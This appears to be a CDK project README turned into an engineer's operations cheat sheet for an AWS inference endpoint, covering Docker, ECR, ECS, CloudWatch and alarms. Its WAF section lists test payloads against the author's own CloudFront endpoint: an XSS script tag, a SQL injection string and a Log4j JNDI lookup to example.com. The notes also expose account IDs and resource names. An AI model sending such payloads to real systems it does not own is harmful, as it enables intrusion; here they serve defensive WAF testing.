# Welcome to your CDK TypeScript project

This is a blank project for CDK development with TypeScript.

The `cdk.json` file tells the CDK Toolkit how to execute your app.

## Useful commands

* `npm run build`   compile typescript to js
* `npm run watch`   watch for changes and compile
* `npm run test`    perform the jest unit tests
* `npx cdk deploy`  deploy this stack to your default AWS account/region
* `npx cdk diff`    compare deployed stack with current state
* `npx cdk synth`   emits the synthesized CloudFormation template

# Docker build
* `docker build` docker --config /tmp/docker_isolated build -t inference-endpoint-docker -f DockerFile .
* `tag docker` docker --config /tmp/docker_isolated tag inference-endpoint-docker:latest 046576049723.dkr.ecr.ap-southeast-2.amazonaws.com/joblib.inference:latest
* `list local tags` docker --config /tmp/docker_isolated image ls
* `docker run`  docker --config /tmp/docker_isolated run -p 8000:8000 inference-endpoint-docker
* `test.py` python3 test.py
* `curl` curl -X POST -H "Content-Type: application/json" -d @/Users/tintorres/LocalDocs/ai/repo/data-science/model-training/input/data/train/request.json http://localhost:8000/predict

## AWS Agent Toolkit
* `install aws cli` brew update && brew install aws
* `check aws login` aws sts get-caller-identity --profile devopsiam
* `configure aws toolkit` aws configure agent-toolkit --yes --region us-east-1
* `verify aws toolkit` aws agent-toolkit list-available-skills --region us-east-1   

## ECR
* `install cred helper` brew install docker-credential-helper-ecr
* `create repository` aws ecr create-repository --repository-name joblib.inference
* `sandbox docker config` mkdir -p /tmp/docker_isolated && echo '{"auths":{}}' > /tmp/docker_isolated/config.json
* `login ecr` aws ecr get-login-password --region ap-southeast-2 --profile devopsiam | docker --config /tmp/docker_isolated login --username AWS --password-stdin 046576049723.dkr.ecr.ap-southeast-2.amazonaws.com
* `docker pull` docker --config /tmp/docker_isolated pull 046576049723.dkr.ecr.ap-southeast-2.amazonaws.com/joblib.inference:latest
* `docker push` docker --config /tmp/docker_isolated push 046576049723.dkr.ecr.ap-southeast-2.amazonaws.com/joblib.inference:latest
* `check repositories` aws ecr describe-repositories --profile devopsiam
* `check image` aws ecr describe-images --repository-name joblib.inference --profile devopsiam
* `check digest` docker --config /tmp/docker_isolated inspect 046576049723.dkr.ecr.ap-southeast-2.amazonaws.com/joblib.inference:latest | grep digest && \
docker --config /tmp/docker_isolated pull 046576049723.dkr.ecr.ap-southeast-2.amazonaws.com/joblib.inference:latest | grep Digest
* `check image` aws ecr describe-images \
  --repository-name joblib.inference \
  --image-ids imageTag=latest \
  --region ap-southeast-2 \
  --query 'imageDetails[0].imageDigest' \
  --output text
* `restart docker desktop` osascript -e 'quit app "Docker"' && sleep 3 && open -a Docker

## CloudWatch and Cloud Trail
* `cloudwatch log` aws logs start-query \
  --profile devopsiam \
  --log-group-name-patterns "/ecs/inference" "InferenceEndpointCdk" \
  --start-time $(date -u -v-5H +%Y-%m-%dT%H:%M:%SZ) \
  --end-time $(date +%s) \
  --query-string 'fields @timestamp, @message, @logStream, @log | sort @timestamp desc | limit 100'
  
* `cloudtrail log` # aws cloudtrail lookup-events \
  --region ap-southeast-2 \
  --lookup-attributes AttributeKey=ResourceName,AttributeValue=InferenceEndpointCdk \
  --start-time $(date -u -v-2H +%Y-%m-%dT%H:%M:%SZ)

## AWS Deployment
* `Update IAM role` aws iam attach-role-policy \
    --role-name InferenceEndpointCdk-InferenceServiceTaskDefExecuti-R6y7YHEawXIW \
    --policy-arn arn:aws:iam::aws:policy/service-role/AmazonECSTaskExecutionRolePolicy
* `Enable ECS Action Logs on the cluster` aws ecs update-cluster \
  --cluster InferenceCluster \
  --configuration "executeCommandConfiguration={logging=DEFAULT}" \
  --profile devopsiam
* `Force new task deployment` aws ecs update-service \
  --cluster InferenceCluster \
  --service InferenceEndpointCdk-InferenceService3909D8EA-zIIFiLXL66Fa \
  --force-new-deployment \
  --region ap-southeast-2
* `api endpoint` https://<api-id>.execute-api.<region>.amazonaws.com/prod/predict
* `check ECS Service` aws ecs list-tasks \
    --cluster InferenceCluster \
    --service-name InferenceEndpointCdk-InferenceService \
    --profile [profile]
* `check ECS task` aws ecs execute-command \
    --cluster InferenceCluster \
    --task 96ab3d14168048088ce8d38e71868bae \
    --container InferenceContainer \
    --interactive \
    --command "/bin/sh" \
    --region ap-southeast-2

## WAF
* `XSS attempt` curl -v "https://d31shfqvmdoxrq.cloudfront.net/health?param=<script>alert(1)</script>"
* `SQL Injection` curl -v "https://d31shfqvmdoxrq.cloudfront.net/health?id=1' OR '1'='1\""
* `Log4j exploit pattern` curl -H "X-Api-Version: ${jndi:ldap://example.com/a}" "https://d31shfqvmdoxrq.cloudfront.net/health"
* `IP reputation` curl -v "https://d31shfqvmdoxrq.cloudfront.net/health"


## Cloudfront
`distribution` aws cloudfront get-distribution --id E6YRTSG3IGJ0Q


## Deployment Outputs
`InferenceEndpointCdk.CloudWatchLogGroup` InferenceEndpointCdk-InferenceLogGroup847A2373-KU5TVo521lch
`InferenceEndpointCdk.EcsClusterName` InferenceCluster
`InferenceEndpointCdk.InferenceEndpointUrl` https://d25pvuax3998m8.cloudfront.net
`InferenceEndpointCdk.NlbUrl` http://Infere-Infer-yLnk47yIrClT-efdbd9efd9daf263.elb.ap-southeast-2.amazonaws.com
`Stack ARN` arn:aws:cloudformation:ap-southeast-2:046576049723:stack/InferenceEndpointCdk/bd881060-8878-11f1-90e8-02555ff2d05f

## Monitoring

`Queue` aws sqs create-queue \
    --queue-name my-alb-latency-queue 
`SNS Topic` aws sns create-topic \
    --name my-alb-latency-alerts 
`Queue Policy` aws sqs set-queue-attributes \
    --queue-url https://sqs.ap-southeast-2.amazonaws.com/046576049723/my-alb-latency-queue \
    --attributes '{
        "Policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"sns.amazonaws.com\"},\"Action\":\"sqs:SendMessage\",\"Resource\":\"arn:aws:sqs:ap-southeast-2:046576049723:my-alb-latency-queue\",\"Condition\":{\"ArnEquals\":{\"aws:SourceArn\":\"arn:aws:sns:ap-southeast-2:046576049723:my-alb-latency-alerts\"}}}]}"
    }' 
`Queue Subscription` aws sns subscribe \
    --topic-arn arn:aws:sns:ap-southeast-2:046576049723:my-alb-latency-alerts \
    --protocol sqs \
    --notification-endpoint arn:aws:sqs:ap-southeast-2:046576049723:my-alb-latency-queue \
`Public Topic Message` aws sns publish \
    --topic-arn arn:aws:sns:ap-southeast-2:046576049723:my-alb-latency-alerts \
    --subject "TEST: ALB Latency Alarm" \
    --message "This is a test message for the ALB p99 latency alarm on Infere-Infer-Lr2bmrcBxGw2." 
`Latency Alarm` aws cloudwatch put-metric-alarm \
    --alarm-name "ALB-p99-Latency-Alarm" \
    --alarm-description "Alarm when p99 latency exceeds 1 second" \
    --metric-name TargetResponseTime \
    --namespace AWS/ApplicationELB \
    --extended-statistic p99 \
    --period 60 \
    --threshold 1 \ 
    --comparison-operator GreaterThanThreshold \
    --dimensions Name=LoadBalancer,Value=app/Infere-Infer-Lr2bmrcBxGw2/31a58bf706d0545f \
    --evaluation-periods 3 \
    --datapoints-to-alarm 2 \
    --treat-missing-data notBreaching \
    --alarm-actions arn:aws:sns:ap-southeast-2:046576049723:my-alb-latency-alerts \
    --ok-actions arn:aws:sns:ap-southeast-2:046576049723:my-alb-latency-alerts 

